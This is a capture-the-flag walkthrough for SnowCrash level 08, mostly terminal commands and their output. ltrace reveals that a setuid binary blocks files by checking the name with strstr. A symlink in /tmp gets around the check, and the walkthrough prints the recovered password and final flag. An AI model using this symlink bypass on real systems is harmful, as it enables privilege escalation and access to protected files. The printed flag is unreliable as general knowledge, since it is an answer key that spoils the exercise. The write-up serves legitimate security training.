# Level 08

- Once logged in, you will see couple files
```
???$ ssh level08@localhost -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          localhost 10.110.0.2
level08@localhost's password:
level08@SnowCrash:~$
level08@SnowCrash:~$ ls
level08  token
level08@SnowCrash:~$
level08@SnowCrash:~$ ls -ls
total 16
12 -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
 4 -rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

let's run the binary and see what it does

```
level08@SnowCrash:~$ ./level08
./level08 [file to read]
...
level08@SnowCrash:~$ cat token
cat: token: Permission denied
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```
as seen above, the `token` cannot be accesseed within the `level08` user

of course, the below would not work ;)

```
level08@SnowCrash:~$ chmod +x token
chmod: changing permissions of `token': Operation not permitted
```

`ltrace` with the token that is not accessible, below is the result
```
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff794, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                      = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                  = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$
```
the `strstr` function is used to check if the filename contains `token`, it cannot be executed.

let's try using the symbolic link to resolve this
```
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/passcode
level08@SnowCrash:~$ ls -ls /tmp/passcode
0 lrwxrwxrwx 1 level08 level08 24 May 11 04:57 /tmp/passcode -> /home/user/level08/token
```
at least the permissions are set, and let's run

```
level08@SnowCrash:~$ ./level08 /tmp/passcode
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$
```
